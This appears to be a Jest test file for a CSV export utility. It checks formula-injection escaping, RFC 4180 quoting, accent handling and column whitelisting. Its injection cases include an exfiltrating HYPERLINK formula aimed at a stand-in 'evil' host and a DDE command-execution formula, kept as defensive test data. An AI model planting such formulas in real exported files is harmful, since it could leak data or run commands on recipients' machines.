/**
 * CSV EXPORT REGRESSION
 *
 * This file is downloaded and opened by journalists and NGOs — the people the export exists
 * to serve. Two failure modes:
 *
 *   - Formula injection turns our transparency artefact into an attack on the people
 *     auditing us. Titles and locations are typed by admins and contractors, so the input
 *     is not trusted.
 *   - Mangled accents make Cameroonian place names unreadable for most of the audience.
 */

import { escapeCell, toCsv } from '../utils/csv.js';

describe('escapeCell — formula injection', () => {
    test.each([
        ['equals', '=1+1'],
        ['plus', '+1+1'],
        ['minus', '-1+1'],
        ['at', '@SUM(A1)'],
        ['hyperlink attack', '=HYPERLINK("http://evil/?"&A1,"Click me")'],
        ['command attack', '=cmd|\' /C calc\'!A0'],
    ])('neutralises a %s formula', (_label, payload) => {
        const cell = escapeCell(payload);
        // The value survives — we are not silently destroying data — but a spreadsheet will
        // treat it as text.
        expect(cell.startsWith("'") || cell.startsWith('"\'')).toBe(true);
        expect(cell).toContain(payload.replace(/"/g, '""'));
    });

    test('leaves ordinary text alone', () => {
        expect(escapeCell('Yaoundé-Douala Highway')).toBe('Yaoundé-Douala Highway');
        expect(escapeCell('Regional Hospital Maroua')).toBe('Regional Hospital Maroua');
    });

    test('a negative NUMBER stays numeric so it can be sorted and filtered', () => {
        // variance_points is negative precisely when a project is in trouble. Guarding it as
        // text would make the export's headline column unusable for analysis.
        expect(escapeCell(-500)).toBe('-500');
        expect(escapeCell(0)).toBe('0');
        expect(escapeCell(1e9)).toBe('1000000000');
    });

    test('but a negative-looking STRING is still guarded', () => {
        // Injection arrives as user-entered text, which is where the guard belongs.
        expect(escapeCell('-1+1')).toBe("'-1+1");
    });
});

describe('escapeCell — RFC 4180', () => {
    test('quotes values containing a comma', () => {
        expect(escapeCell('Edéa, Littoral')).toBe('"Edéa, Littoral"');
    });

    test('doubles internal quotes', () => {
        expect(escapeCell('The "Ring Road" project')).toBe('"The ""Ring Road"" project"');
    });

    test('quotes values containing newlines', () => {
        expect(escapeCell('line one\nline two')).toBe('"line one\nline two"');
    });

    test('renders null and undefined as empty, not as the strings', () => {
        expect(escapeCell(null)).toBe('');
        expect(escapeCell(undefined)).toBe('');
        expect(escapeCell(0)).toBe('0'); // zero is a value, not absence
    });
});

describe('toCsv', () => {
    const columns = [
        { key: 'id', header: 'id' },
        { key: 'title', header: 'title' },
        { key: 'budget_xaf', header: 'budget_xaf' },
    ];

    test('emits a header row followed by data rows, CRLF separated', () => {
        const csv = toCsv(columns, [{ id: 'p1', title: 'Ring Road', budget_xaf: 1000 }], { bom: false });
        expect(csv).toBe('id,title,budget_xaf\r\np1,Ring Road,1000');
    });

    test('starts with a UTF-8 BOM by default so Excel reads accents correctly', () => {
        const csv = toCsv(columns, [{ id: 'p1', title: 'Edéa', budget_xaf: 1 }]);
        expect(csv.charCodeAt(0)).toBe(0xfeff);
        expect(csv).toContain('Edéa');
    });

    test('emits only the declared columns, in order, ignoring extra object keys', () => {
        // The export is a published contract: it must not gain columns because someone added
        // a field to an internal object.
        const csv = toCsv(columns, [
            { id: 'p1', title: 'X', budget_xaf: 1, password_hash: 'SECRET', internalNote: 'private' },
        ], { bom: false });

        expect(csv).not.toContain('SECRET');
        expect(csv).not.toContain('password_hash');
        expect(csv).not.toContain('private');
        expect(csv.split('\r\n')[0]).toBe('id,title,budget_xaf');
    });

    test('a header row is still emitted when there are no rows', () => {
        const csv = toCsv(columns, [], { bom: false });
        expect(csv).toBe('id,title,budget_xaf');
    });

    test('an injected title cannot break out of its cell', () => {
        const csv = toCsv(columns, [
            { id: 'p1', title: '=1+1,injected,columns', budget_xaf: 5 },
        ], { bom: false });

        const dataRow = csv.split('\r\n')[1];
        // Three columns, not five: the commas stayed inside the quoted cell.
        expect(dataRow.match(/(?:^|,)(?=(?:[^"]*"[^"]*")*[^"]*$)/g).length).toBe(3);
        expect(dataRow).toContain('"\'=1+1,injected,columns"');
    });
});
